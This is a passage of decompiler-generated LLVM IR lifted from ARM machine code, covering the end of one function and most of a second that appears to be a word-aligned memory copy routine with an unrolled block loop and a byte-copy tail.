  %v3_1515c = and i1 %v0_1515c, %v2_1515c
  br i1 %v3_1515c, label %.dec_label_pc_15164_crit_edge, label %dec_label_pc_15160

.dec_label_pc_15164_crit_edge:                    ; preds = %.thread14
  %v0_15164.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_15164

dec_label_pc_15160:                               ; preds = %dec_label_pc_150d4, %dec_label_pc_1512c, %.thread14
  br label %dec_label_pc_15164

dec_label_pc_15164:                               ; preds = %.dec_label_pc_15164_crit_edge, %dec_label_pc_15160
  %v0_15164 = phi i32 [ %v0_15164.pre, %.dec_label_pc_15164_crit_edge ], [ 0, %dec_label_pc_15160 ]
  store i32 %v6_150d4, i32* @r5, align 4
  ret i32 %v0_15164

; uselistorder directives
  uselistorder i1 %v9_15150, { 1, 0, 2 }
  uselistorder i32 %v1_15150, { 1, 0 }
  uselistorder i32 %v0_15150, { 0, 2, 1 }
  uselistorder i32 %v0_15148, { 2, 0, 1 }
  uselistorder i32 %v0_15140, { 1, 0 }
  uselistorder i32 %v3_1511c, { 2, 1, 0, 3 }
  uselistorder i32 %v0_1510c, { 1, 0 }
  uselistorder i32 %v3_150f4, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_15118, { 0, 2, 1 }
  uselistorder i32* %r6.global-to-local, { 0, 2, 3, 1 }
  uselistorder i32* %r3.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 7, 2, 3, 4, 5, 6, 9, 8 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 1, 6, 2, 3, 4, 5, 8, 7 }
  uselistorder i32 (i16*)* @function_14fa8, { 0, 2, 3, 1 }
  uselistorder i1 true, { 0, 1, 69, 101, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 64, 28, 29, 30, 31, 32, 120, 62, 65, 71, 106, 74, 73, 33, 102, 87, 103, 104, 36, 105, 63, 72, 107, 108, 109, 110, 66, 111, 112, 113, 114, 115, 37, 38, 116, 117, 34, 35, 118, 119, 86, 85, 39, 40, 41, 121, 42, 43, 75, 76, 81, 77, 82, 78, 80, 122, 79, 84, 123, 44, 124, 45, 125, 88, 89, 126, 90, 91, 127, 92, 93, 46, 47, 128, 94, 95, 48, 49, 129, 96, 97, 50, 51, 130, 98, 99, 52, 53, 70, 131, 132, 83, 133, 54, 67, 55, 56, 68, 57, 58, 59, 60, 61, 100 }
  uselistorder i32 %arg2, { 2, 1, 0, 3, 4 }
  uselistorder label %dec_label_pc_15164, { 1, 0 }
  uselistorder label %dec_label_pc_15160, { 2, 1, 0 }
  uselistorder label %.thread14, { 1, 0 }
  uselistorder label %dec_label_pc_15150, { 1, 0, 4, 2, 3 }
  uselistorder label %dec_label_pc_150f4, { 1, 0 }
}

define i32 @function_15180() local_unnamed_addr {
dec_label_pc_15180:
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i8*, align 4
  %v0_15180 = load i32, i32* @r1, align 4
  %v1_15180 = load i32, i32* @r0, align 4
  %v2_15180 = sub i32 %v0_15180, %v1_15180
  %v3_15180 = icmp ult i32 %v0_15180, %v1_15180
  %v4_15180 = xor i32 %v1_15180, %v0_15180
  %v5_15180 = xor i32 %v2_15180, %v0_15180
  %v6_15180 = and i32 %v5_15180, %v4_15180
  %v7_15180 = icmp slt i32 %v6_15180, 0
  store i1 %v7_15180, i1* %cpsr_v.global-to-local, align 1
  %v8_15180 = icmp slt i32 %v2_15180, 0
  store i1 %v8_15180, i1* %cpsr_n.global-to-local, align 1
  %v9_15180 = icmp eq i32 %v0_15180, %v1_15180
  store i1 %v9_15180, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_15180, label %dec_label_pc_153d4, label %dec_label_pc_15188

dec_label_pc_15188:                               ; preds = %dec_label_pc_15180
  br i1 %v9_15180, label %.thread130, label %bb

.thread130:                                       ; preds = %bb153, %.thread129, %bb150, %dec_label_pc_15188
  %merge = phi i32 [ %v0_15180, %dec_label_pc_15188 ], [ %v2_15468, %bb150 ], [ %v11_15484, %bb153 ], [ %v7_15484, %.thread129 ]
  ret i32 %merge

bb:                                               ; preds = %dec_label_pc_15188
  %v5_1518c = inttoptr i32 %v1_15180 to i8*
  store i8* %v5_1518c, i8** %stack_var_-8, align 4
  %v8_1518c = load i32, i32* @lr, align 4
  %v0_15190 = load i32, i32* @r2, align 4
  %v2_15190 = add i32 %v0_15190, -4
  store i32 %v2_15190, i32* %r2.global-to-local, align 4
  %v4_15190 = sub i32 3, %v0_15190
  %v5_15190 = and i32 %v4_15190, %v0_15190
  %v6_15190 = icmp slt i32 %v5_15190, 0
  store i1 %v6_15190, i1* %cpsr_v.global-to-local, align 1
  %v7_15190 = icmp slt i32 %v2_15190, 0
  store i1 %v7_15190, i1* %cpsr_n.global-to-local, align 1
  %v8_15190 = icmp eq i32 %v0_15190, 4
  store i1 %v8_15190, i1* %cpsr_z.global-to-local, align 1
  %v5_15194 = icmp slt i32 %v0_15190, 4
  br i1 %v5_15194, label %bb140, label %dec_label_pc_15198

dec_label_pc_15198:                               ; preds = %bb
  %v1_15198 = urem i32 %v1_15180, 4
  store i32 %v1_15198, i32* %ip.global-to-local, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_15198 = icmp eq i32 %v1_15198, 0
  store i1 %v2_15198, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15198, label %dec_label_pc_151a0, label %dec_label_pc_1524c

dec_label_pc_151a0:                               ; preds = %dec_label_pc_15198
  %v1_151a0 = urem i32 %v0_15180, 4
  store i32 %v1_151a0, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_151a0 = icmp eq i32 %v1_151a0, 0
  store i1 %v2_151a0, i1* %cpsr_z.global-to-local, align 1
  %extract.t = trunc i32 %v0_15180 to i2
  br i1 %v2_151a0, label %dec_label_pc_151a8, label %dec_label_pc_1527c

dec_label_pc_151a8:                               ; preds = %dec_label_pc_151a0, %dec_label_pc_15274
  %v0_151c094 = phi i32 [ %v1_15180, %dec_label_pc_151a0 ], [ %v0_1539c77, %dec_label_pc_15274 ]
  %v0_151bc93 = phi i32 [ %v0_15180, %dec_label_pc_151a0 ], [ %v0_15274, %dec_label_pc_15274 ]
  %v0_151a8 = phi i32 [ %v2_15190, %dec_label_pc_151a0 ], [ %v2_1526c, %dec_label_pc_15274 ]
  %v1_151a8 = add i32 %v0_151a8, -8
  store i32 %v1_151a8, i32* %r2.global-to-local, align 4
  %v3_151a8 = sub i32 7, %v0_151a8
  %v4_151a8 = and i32 %v3_151a8, %v0_151a8
  %v5_151a8 = icmp slt i32 %v4_151a8, 0
  store i1 %v5_151a8, i1* %cpsr_v.global-to-local, align 1
  %v6_151a8 = icmp slt i32 %v1_151a8, 0
  store i1 %v6_151a8, i1* %cpsr_n.global-to-local, align 1
  %v7_151a8 = icmp eq i32 %v0_151a8, 8
  store i1 %v7_151a8, i1* %cpsr_z.global-to-local, align 1
  %v2_151ac = xor i1 %v6_151a8, %v5_151a8
  br i1 %v2_151ac, label %dec_label_pc_151fc, label %dec_label_pc_151b0

dec_label_pc_151b0:                               ; preds = %dec_label_pc_151a8
  %v1_151b0 = add i32 %v0_151a8, -28
  store i32 %v1_151b0, i32* %r2.global-to-local, align 4
  %v3_151b0 = sub i32 27, %v0_151a8
  %v4_151b0 = and i32 %v3_151b0, %v1_151a8
  %v5_151b0 = icmp slt i32 %v4_151b0, 0
  store i1 %v5_151b0, i1* %cpsr_v.global-to-local, align 1
  %v6_151b0 = icmp slt i32 %v1_151b0, 0
  store i1 %v6_151b0, i1* %cpsr_n.global-to-local, align 1
  %v7_151b0 = icmp eq i32 %v1_151a8, 20
  store i1 %v7_151b0, i1* %cpsr_z.global-to-local, align 1
  %v2_151b4 = xor i1 %v6_151b0, %v5_151b0
  br i1 %v2_151b4, label %dec_label_pc_151e8, label %dec_label_pc_151b8

dec_label_pc_151b8:                               ; preds = %dec_label_pc_151b0
  %v0_151b8 = load i32, i32* @r4, align 4
  store i32 %v0_151b8, i32* %stack_var_-12, align 4
  br label %dec_label_pc_151bc

dec_label_pc_151bc:                               ; preds = %dec_label_pc_151bc.dec_label_pc_151bc_crit_edge, %dec_label_pc_151b8
  %v0_151c0 = phi i32 [ %v12_151c8, %dec_label_pc_151bc.dec_label_pc_151bc_crit_edge ], [ %v0_151c094, %dec_label_pc_151b8 ]
  %v0_151bc = phi i32 [ %v0_151bc.pre, %dec_label_pc_151bc.dec_label_pc_151bc_crit_edge ], [ %v0_151bc93, %dec_label_pc_151b8 ]
  %v1_151bc = inttoptr i32 %v0_151bc to i32*
  %v2_151bc = load i32, i32* %v1_151bc, align 4
  %v3_151bc = add i32 %v0_151bc, 4
  %v4_151bc = inttoptr i32 %v3_151bc to i32*
  %v5_151bc = load i32, i32* %v4_151bc, align 4
  store i32 %v5_151bc, i32* %r4.global-to-local, align 4
  %v6_151bc = add i32 %v0_151bc, 8
  %v7_151bc = inttoptr i32 %v6_151bc to i32*
  %v8_151bc = load i32, i32* %v7_151bc, align 4
  store i32 %v8_151bc, i32* %ip.global-to-local, align 4
  %v9_151bc = add i32 %v0_151bc, 12
  %v10_151bc = inttoptr i32 %v9_151bc to i32*
  %v11_151bc = load i32, i32* %v10_151bc, align 4
  store i32 %v11_151bc, i32* %lr.global-to-local, align 4
  %v12_151bc = add i32 %v0_151bc, 16
  store i32 %v12_151bc, i32* %r1.global-to-local, align 4
  %v1_151c0 = inttoptr i32 %v0_151c0 to i32*
  store i32 %v2_151bc, i32* %v1_151c0, align 4
  %v3_151c0 = add i32 %v0_151c0, 4
  %v4_151c0 = inttoptr i32 %v3_151c0 to i32*
  %v5_151c0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_151c0, i32* %v4_151c0, align 4
  %v6_151c0 = add i32 %v0_151c0, 8
  %v7_151c0 = inttoptr i32 %v6_151c0 to i32*
  %v8_151c0 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v8_151c0, i32* %v7_151c0, align 4
  %v9_151c0 = add i32 %v0_151c0, 12
  %v10_151c0 = inttoptr i32 %v9_151c0 to i32*
  %v11_151c0 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_151c0, i32* %v10_151c0, align 4
  %v12_151c0 = add i32 %v0_151c0, 16
  store i32 %v12_151c0, i32* %r0.global-to-local, align 4
  %v0_151c4 = load i32, i32* %r1.global-to-local, align 4
  %v1_151c4 = inttoptr i32 %v0_151c4 to i32*
  %v2_151c4 = load i32, i32* %v1_151c4, align 4
  store i32 %v2_151c4, i32* @r3, align 4
  %v3_151c4 = add i32 %v0_151c4, 4
  %v4_151c4 = inttoptr i32 %v3_151c4 to i32*
  %v5_151c4 = load i32, i32* %v4_151c4, align 4
  store i32 %v5_151c4, i32* %r4.global-to-local, align 4
  %v6_151c4 = add i32 %v0_151c4, 8
  %v7_151c4 = inttoptr i32 %v6_151c4 to i32*
  %v8_151c4 = load i32, i32* %v7_151c4, align 4
  store i32 %v8_151c4, i32* @ip, align 4
  %v9_151c4 = add i32 %v0_151c4, 12
  %v10_151c4 = inttoptr i32 %v9_151c4 to i32*
  %v11_151c4 = load i32, i32* %v10_151c4, align 4
  store i32 %v11_151c4, i32* %lr.global-to-local, align 4
  %v12_151c4 = add i32 %v0_151c4, 16
  store i32 %v12_151c4, i32* @r1, align 4
  %v1_151c8 = inttoptr i32 %v12_151c0 to i32*
  store i32 %v2_151c4, i32* %v1_151c8, align 4
  %v3_151c8 = add i32 %v0_151c0, 20
  %v4_151c8 = inttoptr i32 %v3_151c8 to i32*
  %v5_151c8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_151c8, i32* %v4_151c8, align 4
  %v6_151c8 = add i32 %v0_151c0, 24
  %v7_151c8 = inttoptr i32 %v6_151c8 to i32*
  %v8_151c8 = load i32, i32* @ip, align 4
  store i32 %v8_151c8, i32* %v7_151c8, align 4
  %v9_151c8 = add i32 %v0_151c0, 28
  %v10_151c8 = inttoptr i32 %v9_151c8 to i32*
  %v11_151c8 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_151c8, i32* %v10_151c8, align 4
  %v12_151c8 = add i32 %v0_151c0, 32
  store i32 %v12_151c8, i32* @r0, align 4
  %v0_151cc = load i32, i32* %r2.global-to-local, align 4
  %v1_151cc = add i32 %v0_151cc, -32
  store i32 %v1_151cc, i32* %r2.global-to-local, align 4
  %v3_151cc = sub i32 31, %v0_151cc
  %v4_151cc = and i32 %v3_151cc, %v0_151cc
  %v5_151cc = icmp slt i32 %v4_151cc, 0
  %v6_151cc = icmp slt i32 %v1_151cc, 0
  %v2_151d0 = xor i1 %v6_151cc, %v5_151cc
  br i1 %v2_151d0, label %dec_label_pc_151d4, label %dec_label_pc_151bc.dec_label_pc_151bc_crit_edge

dec_label_pc_151bc.dec_label_pc_151bc_crit_edge:  ; preds = %dec_label_pc_151bc
  %v0_151bc.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_151bc

dec_label_pc_151d4:                               ; preds = %dec_label_pc_151bc
  %v1_151d4 = add i32 %v0_151cc, -16
  %v3_151d4 = add i32 %v0_151cc, 2147483616
  %v4_151d4 = and i32 %v1_151d4, %v3_151d4
  %v5_151d4 = icmp slt i32 %v4_151d4, 0
  store i1 %v5_151d4, i1* %cpsr_v.global-to-local, align 1
  %v6_151d4 = icmp slt i32 %v1_151d4, 0
  store i1 %v6_151d4, i1* %cpsr_n.global-to-local, align 1
  %v7_151d4 = icmp eq i32 %v1_151d4, 0
  store i1 %v7_151d4, i1* %cpsr_z.global-to-local, align 1
  %v2_151d8 = xor i1 %v6_151d4, %v5_151d4
  br i1 %v2_151d8, label %bb137, label %bb136

bb136:                                            ; preds = %dec_label_pc_151d4
  %v3_151d8 = load i32, i32* @r1, align 4
  %v4_151d8 = inttoptr i32 %v3_151d8 to i32*
  %v5_151d8 = load i32, i32* %v4_151d8, align 4
  store i32 %v5_151d8, i32* @r3, align 4
  %v6_151d8 = add i32 %v3_151d8, 4
  %v7_151d8 = inttoptr i32 %v6_151d8 to i32*
  %v8_151d8 = load i32, i32* %v7_151d8, align 4
  store i32 %v8_151d8, i32* %r4.global-to-local, align 4
  %v9_151d8 = add i32 %v3_151d8, 8
  %v10_151d8 = inttoptr i32 %v9_151d8 to i32*
  %v11_151d8 = load i32, i32* %v10_151d8, align 4
  store i32 %v11_151d8, i32* @ip, align 4
  %v12_151d8 = add i32 %v3_151d8, 12
  %v13_151d8 = inttoptr i32 %v12_151d8 to i32*
  %v14_151d8 = load i32, i32* %v13_151d8, align 4
  store i32 %v14_151d8, i32* %lr.global-to-local, align 4
  %v15_151d8 = add i32 %v3_151d8, 16
  store i32 %v15_151d8, i32* @r1, align 4
  %v4_151dc = inttoptr i32 %v12_151c8 to i32*
  store i32 %v5_151d8, i32* %v4_151dc, align 4
  %v6_151dc = add i32 %v0_151c0, 36
  %v7_151dc = inttoptr i32 %v6_151dc to i32*
  %v8_151dc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v8_151dc, i32* %v7_151dc, align 4
  %v9_151dc = add i32 %v0_151c0, 40
  %v10_151dc = inttoptr i32 %v9_151dc to i32*
  %v11_151dc = load i32, i32* @ip, align 4
  store i32 %v11_151dc, i32* %v10_151dc, align 4
  %v12_151dc = add i32 %v0_151c0, 44
  %v13_151dc = inttoptr i32 %v12_151dc to i32*
  %v14_151dc = load i32, i32* %lr.global-to-local, align 4
  store i32 %v14_151dc, i32* %v13_151dc, align 4
  %v15_151dc = add i32 %v0_151c0, 48
  store i32 %v15_151dc, i32* @r0, align 4
  %v3_151e0 = load i32, i32* %r2.global-to-local, align 4
  %v4_151e0 = add i32 %v3_151e0, -16
  store i32 %v4_151e0, i32* %r2.global-to-local, align 4
  br label %bb137

bb137:                                            ; preds = %dec_label_pc_151d4, %bb136
  %v3_151f0102111 = phi i32 [ %v15_151dc, %bb136 ], [ %v12_151c8, %dec_label_pc_151d4 ]
  %v0_151e8.pre = phi i32 [ %v4_151e0, %bb136 ], [ %v1_151cc, %dec_label_pc_151d4 ]
  %v2_151e4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_151e4, i32* @r4, align 4
  br label %dec_label_pc_151e8

dec_label_pc_151e8:                               ; preds = %dec_label_pc_151b0, %bb137
  %v3_151f0101 = phi i32 [ %v0_151c094, %dec_label_pc_151b0 ], [ %v3_151f0102111, %bb137 ]
  %v0_151e8 = phi i32 [ %v1_151b0, %dec_label_pc_151b0 ], [ %v0_151e8.pre, %bb137 ]
  %v1_151e8 = add i32 %v0_151e8, 20
  store i32 %v1_151e8, i32* %r2.global-to-local, align 4
  %v3_151e8 = sub i32 0, %v0_151e8
  %v4_151e8 = and i32 %v1_151e8, %v3_151e8
  %v5_151e8 = icmp slt i32 %v4_151e8, 0
  store i1 %v5_151e8, i1* %cpsr_v.global-to-local, align 1
  %v6_151e8 = icmp slt i32 %v1_151e8, 0
  store i1 %v6_151e8, i1* %cpsr_n.global-to-local, align 1
  %v7_151e8 = icmp eq i32 %v1_151e8, 0
  store i1 %v7_151e8, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_151ec

dec_label_pc_151ec:                               ; preds = %.thread115, %dec_label_pc_151e8
  %v0_151fc.pre157 = phi i32 [ %v0_151fc.pre, %.thread115 ], [ %v1_151e8, %dec_label_pc_151e8 ]
  %v3_151f0 = phi i32 [ %v3_151f099116, %.thread115 ], [ %v3_151f0101, %dec_label_pc_151e8 ]
  %v1_151f4 = phi i1 [ %v1_151f8, %.thread115 ], [ %v5_151e8, %dec_label_pc_151e8 ]
  %v0_151f4 = phi i1 [ %v0_151f8, %.thread115 ], [ %v6_151e8, %dec_label_pc_151e8 ]
  %v2_151ec = xor i1 %v1_151f4, %v0_151f4
  br i1 %v2_151ec, label %.thread115, label %bb138

bb138:                                            ; preds = %dec_label_pc_151ec
  %v3_151ec = load i32, i32* @r1, align 4
  %v4_151ec = inttoptr i32 %v3_151ec to i32*
  %v5_151ec = load i32, i32* %v4_151ec, align 4
  store i32 %v5_151ec, i32* @r3, align 4
  %v6_151ec = add i32 %v3_151ec, 4
  %v7_151ec = inttoptr i32 %v6_151ec to i32*
  %v8_151ec = load i32, i32* %v7_151ec, align 4
  store i32 %v8_151ec, i32* @ip, align 4
  %v9_151ec = add i32 %v3_151ec, 8
  %v10_151ec = inttoptr i32 %v9_151ec to i32*
  %v11_151ec = load i32, i32* %v10_151ec, align 4
  store i32 %v11_151ec, i32* %lr.global-to-local, align 4
  %v12_151ec = add i32 %v3_151ec, 12
  store i32 %v12_151ec, i32* @r1, align 4
  %v4_151f0 = inttoptr i32 %v3_151f0 to i32*
  store i32 %v5_151ec, i32* %v4_151f0, align 4
  %v6_151f0 = add i32 %v3_151f0, 4
  %v7_151f0 = inttoptr i32 %v6_151f0 to i32*
  %v8_151f0 = load i32, i32* @ip, align 4
  store i32 %v8_151f0, i32* %v7_151f0, align 4
  %v9_151f0 = add i32 %v3_151f0, 8
  %v10_151f0 = inttoptr i32 %v9_151f0 to i32*
  %v11_151f0 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_151f0, i32* %v10_151f0, align 4
  %v12_151f0 = add i32 %v3_151f0, 12
  store i32 %v12_151f0, i32* @r0, align 4
  %v3_151f4 = load i32, i32* %r2.global-to-local, align 4
  %v4_151f4 = add i32 %v3_151f4, -12
  store i32 %v4_151f4, i32* %r2.global-to-local, align 4
  %v6_151f4 = sub i32 11, %v3_151f4
  %v7_151f4 = and i32 %v6_151f4, %v3_151f4
  %v8_151f4 = icmp slt i32 %v7_151f4, 0
  store i1 %v8_151f4, i1* %cpsr_v.global-to-local, align 1
  %v9_151f4 = icmp slt i32 %v4_151f4, 0
  store i1 %v9_151f4, i1* %cpsr_n.global-to-local, align 1
  %v10_151f4 = icmp eq i32 %v3_151f4, 12
  store i1 %v10_151f4, i1* %cpsr_z.global-to-local, align 1
  br label %.thread115

.thread115:                                       ; preds = %dec_label_pc_151ec, %bb138
  %v0_151fc.pre = phi i32 [ %v4_151f4, %bb138 ], [ %v0_151fc.pre157, %dec_label_pc_151ec ]
  %v3_151f099116 = phi i32 [ %v12_151f0, %bb138 ], [ %v3_151f0, %dec_label_pc_151ec ]
  %v1_151f8 = phi i1 [ %v8_151f4, %bb138 ], [ %v1_151f4, %dec_label_pc_151ec ]
  %v0_151f8 = phi i1 [ %v9_151f4, %bb138 ], [ %v0_151f4, %dec_label_pc_151ec ]
  %v2_151f8 = xor i1 %v1_151f8, %v0_151f8
  br i1 %v2_151f8, label %dec_label_pc_151fc, label %dec_label_pc_151ec

dec_label_pc_151fc:                               ; preds = %.thread115, %dec_label_pc_151a8
  %v4_1520c = phi i32 [ %v0_151c094, %dec_label_pc_151a8 ], [ %v3_151f099116, %.thread115 ]
  %v0_151fc = phi i32 [ %v1_151a8, %dec_label_pc_151a8 ], [ %v0_151fc.pre, %.thread115 ]
  %v1_151fc = add i32 %v0_151fc, 8
  store i32 %v1_151fc, i32* %r2.global-to-local, align 4
  %v3_151fc = sub i32 0, %v0_151fc
  %v4_151fc = and i32 %v1_151fc, %v3_151fc
  %v5_151fc = icmp slt i32 %v4_151fc, 0
  store i1 %v5_151fc, i1* %cpsr_v.global-to-local, align 1
  %v6_151fc = icmp slt i32 %v1_151fc, 0
  store i1 %v6_151fc, i1* %cpsr_n.global-to-local, align 1
  %v7_151fc = icmp eq i32 %v1_151fc, 0
  store i1 %v7_151fc, i1* %cpsr_z.global-to-local, align 1
  %v2_15200 = xor i1 %v6_151fc, %v5_151fc
  br i1 %v2_15200, label %bb140, label %dec_label_pc_15204

dec_label_pc_15204:                               ; preds = %dec_label_pc_151fc
  %v1_15204 = add i32 %v0_151fc, 4
  store i32 %v1_15204, i32* %r2.global-to-local, align 4
  %v3_15204 = sub i32 -5, %v0_151fc
  %v4_15204 = and i32 %v3_15204, %v1_151fc
  %v5_15204 = icmp slt i32 %v4_15204, 0
  store i1 %v5_15204, i1* %cpsr_v.global-to-local, align 1
  %v6_15204 = icmp slt i32 %v1_15204, 0
  store i1 %v6_15204, i1* %cpsr_n.global-to-local, align 1
  %v7_15204 = icmp eq i32 %v1_151fc, 4
  store i1 %v7_15204, i1* %cpsr_z.global-to-local, align 1
  %v2_15208 = xor i1 %v6_15204, %v5_15204
  %v3_15208 = load i32, i32* @r1, align 4
  %v4_15208 = inttoptr i32 %v3_15208 to i32*
  %v5_15208 = load i32, i32* %v4_15208, align 4
  store i32 %v5_15208, i32* @r3, align 4
  %v7_15208 = add i32 %v3_15208, 4
  br i1 %v2_15208, label %.thread122, label %bb139

.thread122:                                       ; preds = %dec_label_pc_15204
  store i32 %v7_15208, i32* @r1, align 4
  %v5_1520c = inttoptr i32 %v4_1520c to i32*
  store i32 %v5_15208, i32* %v5_1520c, align 4
  %v6_1520c = load i32, i32* @r0, align 4
  %v7_1520c = add i32 %v6_1520c, 4
  store i32 %v7_1520c, i32* @r0, align 4
  %v0_1521c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb140

bb139:                                            ; preds = %dec_label_pc_15204
  %v7_15210 = inttoptr i32 %v7_15208 to i32*
  %v8_15210 = load i32, i32* %v7_15210, align 4
  store i32 %v8_15210, i32* @ip, align 4
  %v9_15210 = add i32 %v3_15208, 8
  store i32 %v9_15210, i32* @r1, align 4
  %v4_15214 = inttoptr i32 %v4_1520c to i32*
  store i32 %v5_15208, i32* %v4_15214, align 4
  %v6_15214 = add i32 %v4_1520c, 4
  %v7_15214 = inttoptr i32 %v6_15214 to i32*
  %v8_15214 = load i32, i32* @ip, align 4
  store i32 %v8_15214, i32* %v7_15214, align 4
  %v9_15214 = add i32 %v4_1520c, 8
  store i32 %v9_15214, i32* @r0, align 4
  %v3_15218 = load i32, i32* %r2.global-to-local, align 4
  %v4_15218 = add i32 %v3_15218, -4
  store i32 %v4_15218, i32* %r2.global-to-local, align 4
  br label %bb140

bb140:                                            ; preds = %.thread122, %.thread128, %dec_label_pc_151fc, %bb, %dec_label_pc_153cc, %dec_label_pc_15360, %dec_label_pc_152f4, %bb139
  %v0_1521c = phi i32 [ %v0_1521c.pre, %.thread122 ], [ %v2_1526c, %.thread128 ], [ %v1_151fc, %dec_label_pc_151fc ], [ %v2_15190, %bb ], [ %v0_1521c61, %dec_label_pc_153cc ], [ %v0_1521c60, %dec_label_pc_15360 ], [ %v0_1521c59, %dec_label_pc_152f4 ], [ %v4_15218, %bb139 ]
  %v1_1521c = add i32 %v0_1521c, 4
  store i32 %v1_1521c, i32* %r2.global-to-local, align 4
  %v3_1521c = sub i32 0, %v0_1521c
  %v4_1521c = and i32 %v1_1521c, %v3_1521c
  %v5_1521c = icmp slt i32 %v4_1521c, 0
  store i1 %v5_1521c, i1* %cpsr_v.global-to-local, align 1
  %v6_1521c = icmp slt i32 %v1_1521c, 0
  store i1 %v6_1521c, i1* %cpsr_n.global-to-local, align 1
  %v7_1521c = icmp eq i32 %v1_1521c, 0
  store i1 %v7_1521c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1521c, label %bb141, label %bb140.bb142_crit_edge

bb140.bb142_crit_edge:                            ; preds = %bb140
  %v0_15224.pre = load i32, i32* @r3, align 4
  br label %bb142

bb141:                                            ; preds = %bb140
  %v3_15220 = load i8*, i8** %stack_var_-8, align 4
  %v4_15220 = ptrtoint i8* %v3_15220 to i32
  store i32 %v4_15220, i32* @r0, align 4
  br label %bb142

bb142:                                            ; preds = %bb140.bb142_crit_edge, %bb141
  %v0_15224 = phi i32 [ %v0_15224.pre, %bb140.bb142_crit_edge ], [ %v8_1518c, %bb141 ]
  call void @__pseudo_cond_branch(i1 %v7_1521c, i32 %v0_15224)
  %v0_15228 = load i32, i32* %r2.global-to-local, align 4
  %v1_15228 = add i32 %v0_15228, -2
  %v3_15228 = sub i32 1, %v0_15228
  %v4_15228 = and i32 %v3_15228, %v0_15228
  %v5_15228 = icmp slt i32 %v4_15228, 0
  store i1 %v5_15228, i1* %cpsr_v.global-to-local, align 1
  %v6_15228 = icmp slt i32 %v1_15228, 0
  store i1 %v6_15228, i1* %cpsr_n.global-to-local, align 1
  %v7_15228 = icmp eq i32 %v0_15228, 2
  store i1 %v7_15228, i1* %cpsr_z.global-to-local, align 1
  %v0_1522c = load i32, i32* @r1, align 4
  %v1_1522c = inttoptr i32 %v0_1522c to i8*
  %v2_1522c = load i8, i8* %v1_1522c, align 1
  %v5_1522c = add i32 %v0_1522c, 1
  store i32 %v5_1522c, i32* %r1.global-to-local, align 4
  %v2_15230 = load i32, i32* @r0, align 4
  %v3_15230 = inttoptr i32 %v2_15230 to i8*
  store i8 %v2_1522c, i8* %v3_15230, align 1
  %v4_15230 = load i32, i32* @r0, align 4
  %v5_15230 = add i32 %v4_15230, 1
  store i32 %v5_15230, i32* %r0.global-to-local, align 4
  %v0_15234 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_15234 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_15234 = xor i1 %v0_15234, %v1_15234
  br i1 %v2_15234, label %.thread125, label %bb143

bb143:                                            ; preds = %bb142
  %v3_15234 = load i32, i32* %r1.global-to-local, align 4
  %v4_15234 = inttoptr i32 %v3_15234 to i8*
  %v5_15234 = load i8, i8* %v4_15234, align 1
  %v8_15234 = add i32 %v3_15234, 1
  store i32 %v8_15234, i32* %r1.global-to-local, align 4
  %v6_15238 = inttoptr i32 %v5_15230 to i8*
  store i8 %v5_15234, i8* %v6_15238, align 1
  %v7_15238 = load i32, i32* %r0.global-to-local, align 4
  %v8_15238 = add i32 %v7_15238, 1
  store i32 %v8_15238, i32* %r0.global-to-local, align 4
  %v1_1523c.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_1523c.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread125

.thread125:                                       ; preds = %bb142, %bb143
  %v7_15240 = phi i32 [ %v8_15238, %bb143 ], [ %v5_15230, %bb142 ]
  %v2_15240 = phi i1 [ %v2_1523c.pre, %bb143 ], [ %v1_15234, %bb142 ]
  %v1_15240 = phi i1 [ %v1_1523c.pre, %bb143 ], [ %v0_15234, %bb142 ]
  %v0_1523c = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_1523c = xor i1 %v2_15240, %v1_15240
  %v4_1523c = or i1 %v0_1523c, %v3_1523c
  br i1 %v4_1523c, label %.thread126, label %bb144

bb144:                                            ; preds = %.thread125
  %v5_1523c = load i32, i32* %r1.global-to-local, align 4
  %v6_1523c = inttoptr i32 %v5_1523c to i8*
  %v7_1523c = load i8, i8* %v6_1523c, align 1
  %v10_1523c = add i32 %v5_1523c, 1
  store i32 %v10_1523c, i32* %r1.global-to-local, align 4
  %v8_15240 = inttoptr i32 %v7_15240 to i8*
  store i8 %v7_1523c, i8* %v8_15240, align 1
  %v9_15240 = load i32, i32* %r0.global-to-local, align 4
  %v10_15240 = add i32 %v9_15240, 1
  store i32 %v10_15240, i32* %r0.global-to-local, align 4
  br label %.thread126

.thread126:                                       ; preds = %.thread125, %bb144
